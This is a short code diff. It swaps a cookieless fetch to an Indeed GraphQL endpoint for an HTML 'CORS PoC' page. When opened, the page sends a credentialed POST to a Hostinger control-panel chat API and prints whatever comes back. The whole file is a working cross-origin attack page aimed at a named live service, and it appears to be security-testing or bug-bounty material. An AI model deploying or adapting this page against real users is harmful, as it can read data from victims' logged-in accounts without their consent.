@@ -1,14 +1,24 @@
-fetch("https://apis.indeed.com/graphql", {
-  method: "POST",
-  mode: "cors",
-  credentials: "omit", // don't send cookies
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    query: "{ __typename }"
-  })
-}).then(res => res.text()).then(console.log).catch(console.error);
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CORS PoC</h2>
+    <script>
+      fetch("https://hpanel.hostinger.com/api/message-hub/api/v1/chat/init", {
+        method: "POST",
+        credentials: "include",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ test: "cors-poc" })
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.body.innerHTML += `<pre>${data}</pre>`;
+      })
+      .catch(err => {
+        document.body.innerHTML += `<pre>❌ Error:\n${err}</pre>`;
+      });
+    </script>
+  </body>
+</html>
 
 
 
